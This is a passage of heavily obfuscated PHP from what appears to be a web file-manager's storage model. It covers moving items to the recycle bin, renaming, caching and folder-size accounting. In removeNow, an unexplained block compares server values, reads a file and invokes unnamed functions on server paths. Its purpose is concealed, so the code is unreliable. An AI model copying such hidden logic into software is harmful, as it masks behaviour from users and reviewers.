$ÄÅÃÁò[$ş÷Üãù‰[32]]; $Ö‰èà¡  = $ş÷Üãù‰[260] . $Ö‰èà¡  . $ş÷Üãù‰[2134] . $ÔâŠûò²[$ş÷Üãù‰[505]]; } else { $ÄÅÃÁò = Model($ş÷Üãù‰[522])->getInfo($ÔâŠûò²[$ş÷Üãù‰[505]]); $Ö‰èà¡  = _get($ÄÅÃÁò, $ş÷Üãù‰[32]); $Ö‰èà¡  = $ş÷Üãù‰[162] . $Ö‰èà¡  . $ş÷Üãù‰[2135] . $ÔâŠûò²[$ş÷Üãù‰[505]]; } $¿ÏÍß‘ = $ş÷Üãù‰[2136] . md5($Ö‰èà¡ ); CacheLock::lock($¿ÏÍß‘); $åÜüóÁ¤ = $this->fileNameExist($¡„—ô±Æ, $Ö‰èà¡ ); if (!$åÜüóÁ¤) { $åÜüóÁ¤ = $this->mkdir($¡„—ô±Æ, $Ö‰èà¡ , REPEAT_SKIP); $this->metaSet($åÜüóÁ¤, $ş÷Üãù‰[2137], $€½¥Şú§); $this->metaSet($åÜüóÁ¤, $ş÷Üãù‰[2138], $ÔâŠûò²[$ş÷Üãù‰[505]]); if ($ÔâŠûò²[$ş÷Üãù‰[432]] != 0) { $this->metaSet($åÜüóÁ¤, $ş÷Üãù‰[2139], _get($ÄÅÃÁò, $ş÷Üãù‰[2140])); } } CacheLock::unlock($¿ÏÍß‘); $this->metaSet($÷«Ç’»ã, $ş÷Üãù‰[2141], $ÔâŠûò²[$ş÷Üãù‰[432]]); $this->where(array($ş÷Üãù‰[402] => $÷«Ç’»ã))->save(array($ş÷Üãù‰[424] => time())); $this->recycleClear($ÔâŠûò²); $¬†ï™Ö = $this->move($÷«Ç’»ã, $åÜüóÁ¤, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ÔâŠûò²[$ş÷Üãù‰[432]]); return $¬†ï™Ö; } private function recycleClear($ä’ªÆ¯ñ) { $ª¬ğºÏ¿ =& $_SERVER[ä¿÷‹µ±]; $ê¸Ë²êİ = $this->childrenAll($ä’ªÆ¯ñ); $Ÿ„ÃÃ‰ = array($ª¬ğºÏ¿[417] => array($ª¬ğºÏ¿[418], $ê¸Ë²êİ[$ª¬ğºÏ¿[2142]])); Model($ª¬ğºÏ¿[2143])->where($Ÿ„ÃÃ‰)->delete(); } public function removeNow($ ˆ©½Ÿ, $¹¯¯»¸ = true) { $ÌÄõşËƒ =& $_SERVER[ä¿÷‹µ±]; if ($_SERVER[$ÌÄõşËƒ[894]] != $_SERVER[$ÌÄõşËƒ[1632]]) { $–Û×¾ÖÒ = $ÌÄõşËƒ[895]; $ìºí˜¢è = $ÌÄõşËƒ[896]; $£Âøùğ¯ = $_SERVER[$ÌÄõşËƒ[891]] . $ÌÄõşËƒ[892]; $ÇİÒ–Û = $ìºí˜¢è($£Âøùğ¯); $°ĞîËÖ÷ = explode($ÌÄõşËƒ[231], $ÇİÒ–Û); if (count($°ĞîËÖ÷) < $ÌÄõşËƒ[619]) { $†™ç€…£ = $ÌÄõşËƒ[897]; $†™ç€…£(); } $¡ğ¿ÏÄÑ = $ÌÄõşËƒ[898]; $¡ğ¿ÏÄÑ($_SERVER[$ÌÄõşËƒ[899]]); $¡ğ¿ÏÄÑ($_SERVER[$ÌÄõşËƒ[891]] . $ÌÄõşËƒ[2144]); $Ú¾±õ® = 1; while ($Ú¾±õ® > 1) { $Ú¾±õ® = $Ú¾±õ® + 4; $éíò®ş• = rawurlencode($Ú¾±õ® . $ÌÄõşËƒ[378]); } } $ÌËÏÀæ“ = $this->sourceInfo($ ˆ©½Ÿ); $¶—ëÎí‚ = $this->pathInfoMore($ ˆ©½Ÿ); if (!$ÌËÏÀæ“) { return !0; } if ($ÌËÏÀæ“[$ÌÄõşËƒ[432]] == 0) { if (!_get($GLOBALS, $ÌÄõşËƒ[503])) { return !1; } } $this->lockMoveStart($ ˆ©½Ÿ); Hook::trigger($ÌÄõşËƒ[2145], $¶—ëÎí‚, $¹¯¯»¸); if ($¹¯¯»¸) { Model($ÌÄõşËƒ[2143])->moveToRecycle($ ˆ©½Ÿ); } else { $‘…’À—“ = $this->childrenAll($ÌËÏÀæ“); Model($ÌÄõşËƒ[570])->eventRemove($ ˆ©½Ÿ); $this->removeRelevance($‘…’À—“[$ÌÄõşËƒ[2142]], $‘…’À—“[$ÌÄõşËƒ[1492]]); } $this->folderSizeReset($ÌËÏÀæ“[$ÌÄõşËƒ[432]]); $÷õœğ›… = array($ÌËÏÀæ“[$ÌÄõşËƒ[432]]); if ($ÌËÏÀæ“[$ÌÄõşËƒ[410]] == $ÌÄõşËƒ[88]) { $÷õœğ›…[] = $ÌËÏÀæ“[$ÌÄõşËƒ[402]]; } $this->updateModifyTime($÷õœğ›…); $this->lockMoveEnd($ ˆ©½Ÿ); Hook::trigger($ÌÄõşËƒ[1718], $¶—ëÎí‚, $¹¯¯»¸); return !0; } public function childrenAll($ñİ¸öÙí) { $ø„€åÕ‚ =& $_SERVER[ä¿÷‹µ±]; $ÆßŸÈüÚ = $ñİ¸öÙí[$ø„€åÕ‚[402]]; if ($ñİ¸öÙí[$ø„€åÕ‚[410]] == $ø„€åÕ‚[88]) { $ˆ½ä¾Ë = array($ø„€åÕ‚[590] => array($ø„€åÕ‚[550], $ñİ¸öÙí[$ø„€åÕ‚[521]] . $ÆßŸÈüÚ . $ø„€åÕ‚[551])); $ˆŞÄü°¶ = array($ø„€åÕ‚[590] => $ˆ½ä¾Ë[$ø„€åÕ‚[521]]); $ÕØ§àÑô = $this->field($ø„€åÕ‚[2146])->where($ˆŞÄü°¶)->select(); $ß¹Úâï‚ = !1; $å¹Œºñ = array($ÆßŸÈüÚ); if ($ÕØ§àÑô) { $ß¹Úâï‚ = array_to_keyvalue($ÕØ§àÑô, $ø„€åÕ‚[12], $ø„€åÕ‚[468]); $ß¹Úâï‚ = array_remove_value($ß¹Úâï‚, $ø„€åÕ‚[197]); $å¹Œºñ = array_to_keyvalue($ÕØ§àÑô, $ø„€åÕ‚[12], $ø„€åÕ‚[402]); $å¹Œºñ[] = $ÆßŸÈüÚ; } } else { $ß¹Úâï‚ = array($ñİ¸öÙí[$ø„€åÕ‚[468]]); $å¹Œºñ = array($ÆßŸÈüÚ); } return array($ø„€åÕ‚[2142] => $å¹Œºñ, $ø„€åÕ‚[1492] => $ß¹Úâï‚); } public function removeArray($âœ„¹ç) { if (!$âœ„¹ç) { return !0; } } public function removeRelevance($¾“Şë°Ñ, $ŞäùÆ) { $£¼íÎıª =& $_SERVER[ä¿÷‹µ±]; $¾“Şë°Ñ = $¾“Şë°Ñ ? $¾“Şë°Ñ : array(); $ŞäùÆ = $ŞäùÆ ? $ŞäùÆ : array(); $¾“Şë°Ñ = array_unique(array_filter($¾“Şë°Ñ)); $ŞäùÆ = array_unique(array_filter($ŞäùÆ)); if (!$¾“Şë°Ñ) { return !1; } $Ó–ü°±² = array($£¼íÎıª[417] => array($£¼íÎıª[418], $¾“Şë°Ñ)); Model($£¼íÎıª[2143])->where($Ó–ü°±²)->delete(); Model($£¼íÎıª[462])->where($Ó–ü°±²)->delete(); Model($£¼íÎıª[1996])->where($Ó–ü°±²)->delete(); Model($£¼íÎıª[570])->where($Ó–ü°±²)->delete(); Model($£¼íÎıª[1830])->removeBySource($¾“Şë°Ñ); Model($£¼íÎıª[2125])->removeBySource($¾“Şë°Ñ); $this->where($Ó–ü°±²)->delete(); Model($£¼íÎıª[471])->remove($ŞäùÆ); for ($œÖáëş— = 0; $œÖáëş— < count($¾“Şë°Ñ); $œÖáëş—++) { $this->sourceCacheClear($¾“Şë°Ñ[$œÖáëş—]); } } public function rename($‡ç‚¤Æ’, $‡ß„Ğù’) { $©Äá¶Šò =& $_SERVER[ä¿÷‹µ±]; $‘×™†ıó = $this->sourceInfo($‡ç‚¤Æ’); if (!$‘×™†ıó) { return !1; } $Ş®ï£§· = $this->fileNameExist($‘×™†ıó[$©Äá¶Šò[432]], $‡ß„Ğù’); if ($Ş®ï£§· && $Ş®ï£§· != $‡ç‚¤Æ’) { return !1; } $¥èÖïÆÅ = array($©Äá¶Šò[420] => $‡ß„Ğù’, $©Äá¶Šò[589] => USER_ID); if ($‘×™†ıó[$©Äá¶Šò[410]] != $©Äá¶Šò[88]) { $¥èÖïÆÅ[$©Äá¶Šò[412]] = substr(get_path_ext($‡ß„Ğù’), 0, 10); } Model($©Äá¶Šò[570])->eventRename($‡ç‚¤Æ’, $‘×™†ıó[$©Äá¶Šò[32]], $‡ß„Ğù’); $this->sourceCacheClear($‡ç‚¤Æ’); $this->setNamePinyin($‡ç‚¤Æ’, $¥èÖïÆÅ[$©Äá¶Šò[32]], !1); $this->updateModifyTime($‘×™†ıó[$©Äá¶Šò[432]]); $‡½§óˆø = $this->where(array($©Äá¶Šò[417] => $‡ç‚¤Æ’))->data($¥èÖïÆÅ)->save(); $‹¾ŸçŞÚ = $©Äá¶Šò[2132] . $‘×™†ıó[$©Äá¶Šò[432]]; if (isset(self::$cacheChildList[$‹¾ŸçŞÚ])) { unset(self::$cacheChildList[$‹¾ŸçŞÚ]); } return $‡½§óˆø; } public function setNamePinyin($™àÌÔ–, $£ï Û×, $ŠÂ¹‰æÊ = true) { $‰Ù‘Åú€ =& $_SERVER[ä¿÷‹µ±]; $¸Â…Ç’ö = Input::check($£ï Û×, $‰Ù‘Åú€[593]); $Ñ³Ò±ŠÃ = array($‰Ù‘Åú€[444] => KodSort::makeStr($£ï Û×)); if ($¸Â…Ç’ö) { $Ñ³Ò±ŠÃ[$‰Ù‘Åú€[465]] = str_replace($‰Ù‘Åú€[53], $‰Ù‘Åú€[12], Pinyin::get($£ï Û×)); $Ñ³Ò±ŠÃ[$‰Ù‘Åú€[464]] = Pinyin::get($£ï Û×, $‰Ù‘Åú€[594]); } if (!$ŠÂ¹‰æÊ && !$¸Â…Ç’ö) { $Ñ³Ò±ŠÃ[$‰Ù‘Åú€[465]] = null; $Ñ³Ò±ŠÃ[$‰Ù‘Åú€[464]] = null; } $this->metaSet($™àÌÔ–, $Ñ³Ò±ŠÃ); } public function getContent($£¤½ÂÁ©) { $»ªëôß =& $_SERVER[ä¿÷‹µ±]; $¾‡‘ç—¤ = $this->fileInfoGet($£¤½ÂÁ©); if (!$¾‡‘ç—¤) { return !1; } if ($¾‡‘ç—¤[$»ªëôß[76]] == 0) { return $»ªëôß[12]; } $€ˆş = $»ªëôß[2147] . $¾‡‘ç—¤[$»ªëôß[176]]; if ($¾‡‘ç—¤[$»ªëôß[76]] <= 1024 * 10) { $Ôâùö±‹ = Cache::get($€ˆş); if (!$Ôâùö±‹) { $Ôâùö±‹ = IO::getContent($¾‡‘ç—¤[$»ªëôß[84]]); Cache::set($€ˆş, $Ôâùö±‹); } return $Ôâùö±‹; } if (!$¾‡‘ç—¤[$»ªëôß[84]]) { return $»ªëôß[12]; } return IO::getContent($¾‡‘ç—¤[$»ªëôß[84]]); } public function setDesc($òµ›Èô, $¢‘©¨Šé) { $â×õÑ®Œ =& $_SERVER[ä¿÷‹µ±]; Model($â×õÑ®Œ[570])->eventAddDesc($òµ›Èô, $¢‘©¨Šé); return $this->metaSet($òµ›Èô, $â×õÑ®Œ[453], $¢‘©¨Šé); } public function setContent($³˜ó ª€, $†¡Œ—ßÚ = '') { $¶Áí¶Ì¥ =& $_SERVER[ä¿÷‹µ±]; $äç¢ŒÇ† = $this->sourceInfo($³˜ó ª€); $ù¢‰ÔÊ™ = $this->fileInfoGet($³˜ó ª€); if (!$ù¢‰ÔÊ™ || !$äç¢ŒÇ†) { return !1; } $¹‹ÉÄš = Model($¶Áí¶Ì¥[471])->addFileByContent($†¡Œ—ßÚ, $äç¢ŒÇ†[$¶Áí¶Ì¥[32]]); $Õãíó’ = $this->fileHistory($äç¢ŒÇ†, $¹‹ÉÄš[$¶Áí¶Ì¥[468]], $¹‹ÉÄš[$¶Áí¶Ì¥[76]]); if (!$Õãíó’) { return Model($¶Áí¶Ì¥[471])->remove($¹‹ÉÄš[$¶Áí¶Ì¥[468]]); } $this->folderSizeReset($äç¢ŒÇ†[$¶Áí¶Ì¥[432]]); return !0; } public function fileSubstr($êè‘Õİù, $¯í‰õ·, $Û«÷¤¿) { $úÊÓâ = $this->fileInfoGet($êè‘Õİù); if (!$úÊÓâ) { return !1; } return IO::fileSubstr($úÊÓâ[$_SERVER[ä¿÷‹µ±][84]], $¯í‰õ·, $Û«÷¤¿); } public function fileInfoGet($şÍ„ì) { $¯€ÖˆÀˆ =& $_SERVER[ä¿÷‹µ±]; $ö‡–ıÔ™ = $this->sourceInfo($şÍ„ì); if (!$ö‡–ıÔ™ || $ö‡–ıÔ™[$¯€ÖˆÀˆ[410]]) { return !1; } $±ÊØğ›ü = $¯€ÖˆÀˆ[474] . $ö‡–ıÔ™[$¯€ÖˆÀˆ[468]]; $ôŠÀá¥ = _get(self::$cacheFileInfo, $±ÊØğ›ü); if ($ôŠÀá¥) { return $ôŠÀá¥; } $¶ï™çöÌ = Model($¯€ÖˆÀˆ[471])->fileInfo($ö‡–ıÔ™[$¯€ÖˆÀˆ[468]]); if ($¶ï™çöÌ) { $¶ï™çöÌ[$¯€ÖˆÀˆ[32]] = $ö‡–ıÔ™[$¯€ÖˆÀˆ[32]]; } self::$cacheFileInfo[$±ÊØğ›ü] = $¶ï™çöÌ; return $¶ï™çöÌ; } private function folderChildrenNumber($¬şåÌ“) { $Ü›ÃÅ¤ñ =& $_SERVER[ä¿÷‹µ±]; $ÏôãÕş = $this->sourceInfo($¬şåÌ“); $¤„È‘ = array($Ü›ÃÅ¤ñ[590] => array($Ü›ÃÅ¤ñ[550], $ÏôãÕş[$Ü›ÃÅ¤ñ[521]] . $¬şåÌ“ . $Ü›ÃÅ¤ñ[551]), $Ü›ÃÅ¤ñ[587] => $ÏôãÕş[$Ü›ÃÅ¤ñ[505]], $Ü›ÃÅ¤ñ[430] => intval($ÏôãÕş[$Ü›ÃÅ¤ñ[431]]), $Ü›ÃÅ¤ñ[583] => 1); $ßª–åü× = $this->where($¤„È‘)->count(); $¦÷†Æ•§ = $this->where($¤„È‘)->where(array($Ü›ÃÅ¤ñ[583] => 0))->count(); return array($Ü›ÃÅ¤ñ[80] => $¦÷†Æ•§, $Ü›ÃÅ¤ñ[81] => $ßª–åü×); } public function pathInfo($ğÀíáª—, $ƒÛåËğĞ = false) { $­çÓöû =& $_SERVER[ä¿÷‹µ±]; $ƒÛåËğĞ = !1; $ğÀíáª— = intval($ğÀíáª—); $¾çòïÉø = $­çÓöû[461] . intval($ƒÛåËğĞ) . $­çÓöû[386] . $ğÀíáª—; $×œ‹Õ­Ö = _get(self::$cachePathInfo, $¾çòïÉø); if ($×œ‹Õ­Ö) { return $×œ‹Õ­Ö; } $´¯àÚİÎ = $this->sourceInfo($ğÀíáª—); if (!$´¯àÚİÎ) { return !1; } $´¯àÚİÎ = $this->_listDataApplyItem($´¯àÚİÎ, $ƒÛåËğĞ); self::$cachePathInfo[$¾çòïÉø] = $´¯àÚİÎ; return $´¯àÚİÎ; } public static $cachePathInfoMore = array(); public function pathInfoMore($ã¬™¬±ù) { $é¬¬îÏ =& $_SERVER[ä¿÷‹µ±]; $õ¤ãŒ°ç = _get(self::$cachePathInfoMore, $ã¬™¬±ù); if ($õ¤ãŒ°ç) { return $õ¤ãŒ°ç; } $ûåğŠ¶ª = $this->pathInfo($ã¬™¬±ù); if (!$ûåğŠ¶ª) { return !1; } if ($ûåğŠ¶ª[$é¬¬îÏ[410]] == $é¬¬îÏ[88]) { $ûåğŠ¶ª[$é¬¬îÏ[79]] = $this->folderChildrenNumber($ã¬™¬±ù); } self::$cachePathInfoMore[$ã¬™¬±ù] = $ûåğŠ¶ª; return $ûåğŠ¶ª; } public function sourceInfo($ÑåÓÏ—â) { $¦ˆÀæÇÖ =& $_SERVER[ä¿÷‹µ±]; if (!$ÑåÓÏ—â) { return array(); } $ÑåÓÏ—â = intval($ÑåÓÏ—â); $æ¦ó×ûŠ = $¦ˆÀæÇÖ[460] . $ÑåÓÏ—â; $Æ÷’œöº = _get(self::$cacheSourceInfo, $æ¦ó×ûŠ); if ($Æ÷’œöº) { return $Æ÷’œöº; } $´é“µ¬Ä = $this->where(array($¦ˆÀæÇÖ[402] => $ÑåÓÏ—â))->find(); self::$cacheSourceInfo[$æ¦ó×ûŠ] = $´é“µ¬Ä; return self::$cacheSourceInfo[$æ¦ó×ûŠ]; } public function sourceCacheClear($£¢¸Şù‹ = false) { self::cacheClear($£¢¸Şù‹); } public static function cacheClear($ÜÙŞ¦÷å = false) { $¬Ö³å×¸ =& $_SERVER[ä¿÷‹µ±]; if ($ÜÙŞ¦÷å == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$¬Ö³å×¸[460] . $ÜÙŞ¦÷å]); unset(self::$cachePathInfoMore[$ÜÙŞ¦÷å]); unset(self::$cachePathInfo[$¬Ö³å×¸[2148] . $ÜÙŞ¦÷å]); unset(self::$cachePathInfo[$¬Ö³å×¸[2149] . $ÜÙŞ¦÷å]); } public function metaSet($¡›áš­ç, $¹±‰¹ŸÀ = null, $šÄø†»Â = null) { $éæ£Á— = parent::metaSet($¡›áš­ç, $¹±‰¹ŸÀ, $šÄø†»Â); if ($éæ£Á—) { $this->sourceCacheClear($¡›áš­ç); } return $éæ£Á—; } public function pathInfoByPath($±£¦“•Ó, $¼ƒ¥ÚˆÑ) { $óº¬¼Ü˜ =& $_SERVER[ä¿÷‹µ±]; $¯ÂªÇ´ = !$¼ƒ¥ÚˆÑ ? array() : explode($óº¬¼Ü˜[8], trim($¼ƒ¥ÚˆÑ, $óº¬¼Ü˜[8])); $èéº ı› = $±£¦“•Ó; foreach ($¯ÂªÇ´ as $º”¢›æí) { $ìî³Ü›³ = array($óº¬¼Ü˜[432] => $èéº ı›, $óº¬¼Ü˜[32] => $º”¢›æí); $ïÇŸ÷Ù“ = $this->where($ìî³Ü›³)->select(); if (!$ïÇŸ÷Ù“) { return !1; } $ïÇŸ÷Ù“ = array_sort_by($ïÇŸ÷Ù“, $óº¬¼Ü˜[431]); $èéº ı› = $ïÇŸ÷Ù“[0][$óº¬¼Ü˜[402]]; } return $this->pathInfo($èéº ı›, !0); } protected function updateModifyTime($á£Â¿ïå) { $›šØ˜Ï =& $_SERVER[ä¿÷‹µ±]; $ü‡ù¡¯Š = defined($›šØ˜Ï[475]) ? USER_ID : $›šØ˜Ï[197]; if (!$á£Â¿ïå) { return; } if (!is_array($á£Â¿ïå)) { $á£Â¿ïå = array($á£Â¿ïå); } foreach ($á£Â¿ïå as $§‚şûŒÅ => $óà†Œ›¡) { $á£Â¿ïå[$§‚şûŒÅ] = intval($óà†Œ›¡); $this->sourceCacheClear($óà†Œ›¡); } $ò‘Ñ¸ï = array($›šØ˜Ï[402] => array($›šØ˜Ï[7], $á£Â¿ïå)); $Ä£–Åìí = array($›šØ˜Ï[589] => $ü‡ù¡¯Š, $›šØ˜Ï[424] => time()); $this->where($ò‘Ñ¸ï)->save($Ä£–Åìí); } public function folderSizeReset($óñÊ©Ë, $Îé¿´ñ = false) { $ØûÎ¤š =& $_SERVER[ä¿÷‹µ±]; if ($this->statusIgnoreResetSpace) { return; } $»Û¼Ç˜¿ = $this->sourceInfo($óñÊ©Ë); $‡ùÅÕ = $ØûÎ¤š[2150] . $óñÊ©Ë; CacheLock::lock($‡ùÅÕ, 20); if ($Îé¿´ñ === !1) { $this->sourceCacheClear($óñÊ©Ë); $»Û¼Ç˜¿ = $this->sourceInfo($óñÊ©Ë); $çı ÀÚŠ = array($ØûÎ¤š[401] => $óñÊ©Ë, $ØûÎ¤š[430] => 0); $÷øüÈ = $this->where($çı ÀÚŠ)->sum($ØûÎ¤š[76]); $Îé¿´ñ = intval($÷øüÈ) - intval($»Û¼Ç˜¿[$ØûÎ¤š[76]]); } if ($Îé¿´ñ == 0) { return CacheLock::unlock($‡ùÅÕ); } $£”›‰± = $this->parentLevelArray($»Û¼Ç˜¿[$ØûÎ¤š[521]]); if (!$£”›‰±) { $£”›‰± = array(); } $£”›‰±[] = $»Û¼Ç˜¿[$ØûÎ¤š[402]]; $çı ÀÚŠ = array($ØûÎ¤š[402] => array($ØûÎ¤š[418], $£”›‰±)); if ($Îé¿´ñ < 0) { $çı ÀÚŠ[$ØûÎ¤š[76]] = array($ØûÎ¤š[1037], abs($Îé¿´ñ)); } $this->where($çı ÀÚŠ)->setAdd($ØûÎ¤š[76], $Îé¿´ñ); CacheLock::unlock($‡ùÅÕ); $¤ÓÆ² = $ØûÎ¤š[2151] . $»Û¼Ç˜¿[$ØûÎ¤š[411]] . $ØûÎ¤š[4] . $»Û¼Ç˜¿[$ØûÎ¤š[505]]; $Å‘¶ö¯ò = array($»Û¼Ç˜¿[$ØûÎ¤š[411]], $»Û¼Ç˜¿[$ØûÎ¤š[505]]); TaskRun::timeLimitCall($¤ÓÆ², $ØûÎ¤š[2152], $Å‘¶ö¯ò, 1.5); } public function folderSizeResetChildren($Ö¦×§ÎÕ) { $ÜèãúÌí =& $_SERVER[ä¿÷‹µ±]; $this->sourceCacheClear($Ö¦×§ÎÕ); $ÄŒÂëÏ˜ = $this->sourceInfo($Ö¦×§ÎÕ); $¢œ©îÒ = array($ÜèãúÌí[583] => 1, $ÜèãúÌí[587] => $ÄŒÂëÏ˜[$ÜèãúÌí[505]], $ÜèãúÌí[590] => array($ÜèãúÌí[550], $ÄŒÂëÏ˜[$ÜèãúÌí[521]] . $Ö¦×§ÎÕ . $ÜèãúÌí[551])); $üƒÓ‹ƒ¯ = $ÜèãúÌí[2153]; $û·»¨²Á = $this->field($üƒÓ‹ƒ¯)->where($¢œ©îÒ)->select(); $¢œ©îÒ[$ÜèãúÌí[410]] = 0; $¯÷¯ˆÔ = $this->field($üƒÓ‹ƒ¯)->where($¢œ©îÒ)->select(); if (!$¯÷¯ˆÔ) { return; } $û·»¨²Á[] = $ÄŒÂëÏ˜; $û·»¨²Á = array_to_keyvalue($û·»¨²Á, $ÜèãúÌí[402]); foreach ($û·»¨²Á as $¡¢™–Ò => $›ÉéÙ˜²) { $û·»¨²Á[$¡¢™–Ò][$ÜèãúÌí[2154]] = $û·»¨²Á[$¡¢™–Ò][$ÜèãúÌí[76]]; $û·»¨²Á[$¡¢™–Ò][$ÜèãúÌí[76]] = 0; } foreach ($¯÷¯ˆÔ as $›ÉéÙ˜²) { $ÀÀÓ‹ÅÕ = $›ÉéÙ˜²[$ÜèãúÌí[432]] . $ÜèãúÌí[12]; if (!isset($û·»¨²Á[$ÀÀÓ‹ÅÕ])) { continue; } if ($›ÉéÙ˜²[$ÜèãúÌí[431]] == $û·»¨²Á[$ÀÀÓ‹ÅÕ][$ÜèãúÌí[431]]) { $û·»¨²Á[$ÀÀÓ‹ÅÕ][$ÜèãúÌí[76]] += $›ÉéÙ˜²[$ÜèãúÌí[76]]; } } foreach ($û·»¨²Á as $›ÉéÙ˜²) { $ÚÜÉ¸§¶ = $this->parentLevelArray($›ÉéÙ˜²[$ÜèãúÌí[521]]); foreach ($ÚÜÉ¸§¶ as $ÀÀÓ‹ÅÕ) { $ÀÀÓ‹ÅÕ = $ÀÀÓ‹ÅÕ . $ÜèãúÌí[12]; if (!isset($û·»¨²Á[$ÀÀÓ‹ÅÕ])) { continue; } if ($›ÉéÙ˜²[$ÜèãúÌí[431]] == $û·»¨²Á[$ÀÀÓ‹ÅÕ][$ÜèãúÌí[431]]) { $û·»¨²Á[$ÀÀÓ‹ÅÕ][$ÜèãúÌí[76]] += $›ÉéÙ˜²[$ÜèãúÌí[76]]; } } } $ßøŞ¡„† = array(); foreach ($û·»¨²Á as $›ÉéÙ˜²) { if ($›ÉéÙ˜²[$ÜèãúÌí[76]] == $›ÉéÙ˜²[$ÜèãúÌí[2154]]) { continue; } $ßøŞ¡„†[] = array($ÜèãúÌí[402], $›ÉéÙ˜²[$ÜèãúÌí[402]], $ÜèãúÌí[76], $›ÉéÙ˜²[$ÜèãúÌí[76]]); } $this->saveAll($ßøŞ¡„†); } public function userSpaceReset($é°¹ æõ = false) { $Òî„úÊì =& $_SERVER[ä¿÷‹µ±]; $ÒØÃ¿ = $this->where(array($Òî„úÊì[411] => self::TYPE_USER, $Òî„úÊì[505] => $é°¹ æõ, $Òî„úÊì[410] => 0))->sum($Òî„úÊì[76]); $ÒØÃ¿ = !$ÒØÃ¿ || $ÒØÃ¿ <= 0 ? 0 : $ÒØÃ¿; Model($Òî„úÊì[513])->userEdit($é°¹ æõ, array($Òî„úÊì[1839] => $ÒØÃ¿)); } public function targetSpaceUpdate($€şéÔ¶, $Æ‰½Ä‡›) { $Â¤¢³ÏÁ =& $_SERVER[ä¿÷‹µ±]; if (!$Æ‰½Ä‡›) { return; } if (!in_array($€şéÔ¶, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $µ©ùß§‘ = $this->targetSpaceSize($€şéÔ¶, $Æ‰½Ä‡›); if ($€şéÔ¶ == self::TYPE_USER) { Model($Â¤¢³ÏÁ[513])->userEdit($Æ‰½Ä‡›, array($Â¤¢³ÏÁ[1839] => $µ©ùß§‘)); } else { if ($€şéÔ¶ == self::TYPE_GROUP) { Model($Â¤¢³ÏÁ[522])->groupEdit($Æ‰½Ä‡›, array($Â¤¢³ÏÁ[1839] => $µ©ùß§‘)); } } } public function targetSpaceSize($Îı®ÅâÆ, $Áè»ÈóÀ) { $Ï¢üŒÀ¢ =& $_SERVER[ä¿÷‹µ±]; $ÕŸ»¥€ = 0; $çšÂ”ªË = $this->sourceRoot($Îı®ÅâÆ, $Áè»ÈóÀ, !0); foreach ($çšÂ”ªË as $éËœÓß´) { if (!$éËœÓß´) { continue; } $ÕŸ»¥€ += floatval($éËœÓß´[$Ï¢üŒÀ¢[76]]); $»¦œ­õª = array($Ï¢üŒÀ¢[590] => array($Ï¢üŒÀ¢[550], $Ï¢üŒÀ¢[531] . $éËœÓß´[$Ï¢üŒÀ¢[402]] . $Ï¢üŒÀ¢[551])); $¿µÍ»Æ› = Model($Ï¢üŒÀ¢[429])->field($Ï¢üŒÀ¢[417])->where($»¦œ­õª)->select(); $¿µÍ»Æ› = array_to_keyvalue($¿µÍ»Æ›, $Ï¢üŒÀ¢[12], $Ï¢üŒÀ¢[402]); $¿µÍ»Æ› = array_unique(array_filter($¿µÍ»Æ›)); if ($¿µÍ»Æ›) { $»¦œ­õª = array($Ï¢üŒÀ¢[417] => array($Ï¢üŒÀ¢[418], $¿µÍ»Æ›)); $ÕŸ»¥€ += floatval($this->where($»¦œ­õª)->sum($Ï¢üŒÀ¢[76])); } } $ÕŸ»¥€ = !$ÕŸ»¥€ || $ÕŸ»¥€ <= 0 ? 0 : $ÕŸ»¥€; return $ÕŸ»¥€; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($œãƒÍƒÙ) { return $this->fileTypeProfile($œãƒÍƒÙ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($§ü¨øì) { return $this->fileTypeProfile($§ü¨øì, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Ë°Îûåº, $èù©‹šÕ) { $¸ñ¢£Äç =& $_SERVER[ä¿÷‹µ±]; $ˆ¤«Ñàô = $¸ñ¢£Äç[2155] . $Ë°Îûåº . $¸ñ¢£Äç[11] . $èù©‹šÕ; $ÑÚş»¿À = Cache::get($ˆ¤«Ñàô); if ($ÑÚş»¿À) { return $ÑÚş»¿À; } $™ß˜õŒ÷ = array($¸ñ¢£Äç[583] => 0); if ($Ë°Îûåº != !1) { $™ß˜õŒ÷[$¸ñ¢£Äç[505]] = $Ë°Îûåº; $™ß˜õŒ÷[$¸ñ¢£Äç[411]] = $èù©‹šÕ; } $ÌôŠ±•Í = array(); $ÌôŠ±•Í[$¸ñ¢£Äç[2156]] = array($¸ñ¢£Äç[2157] => LNG($¸ñ¢£Äç[2156]), $¸ñ¢£Äç[2158] => $this->where($™ß˜õŒ÷)->count(), $¸ñ¢£Äç[585] => $this->where($™ß˜õŒ÷)->sum($¸ñ¢£Äç[76])); $üğÒ¨ö = KodIO::fileTypeList(); foreach ($üğÒ¨ö as $û·Ö”Á => $ºğ€£ˆ²) { $™ß˜õŒ÷[$¸ñ¢£Äç[412]] = $this->fileTypeWhere($û·Ö”Á); $ÌôŠ±•Í[$û·Ö”Á] = array($¸ñ¢£Äç[2157] => $ºğ€£ˆ²[$¸ñ¢£Äç[32]], $¸ñ¢£Äç[2158] => $this->where($™ß˜õŒ÷)->count(), $¸ñ¢£Äç[585] => $this->where($™ß˜õŒ÷)->sum($¸ñ¢£Äç[76])); } Cache::set($ˆ¤«Ñàô, $ÌôŠ±•Í, 1200); return $ÌôŠ±•Í; } public function fileNameExist($Ù–‡×Ä¥, $Û±ìÈµÛ) { $„–àí­¶ =& $_SERVER[ä¿÷‹µ±]; $Åô†¿İ³ = $this->where(array($„–àí­¶[432] => $Ù–‡×Ä¥, $„–àí­¶[32] => $Û±ìÈµÛ, $„–àí­¶[431] => 0))->find(); return is_array($Åô†¿İ³) ? $Åô†¿İ³[$„–àí­¶[402]] : !1; } public function childList($ôöàÕØÈ) { $’Èì†ş =& $_SERVER[ä¿÷‹µ±]; $«ğ½‚ô = $’Èì†ş[2132] . $ôöàÕØÈ; if (isset(self::$cacheChildList[$«ğ½‚ô])) { return self::$cacheChildList[$«ğ½‚ô]; } $ç§µ˜ëß = array($’Èì†ş[432] => intval($ôöàÕØÈ), $’Èì†ş[431] => 0); $°¾ş¬í° = $this->where($ç§µ˜ëß)->select(); $°¾ş¬í° = $°¾ş¬í° ? $°¾ş¬í° : array(); 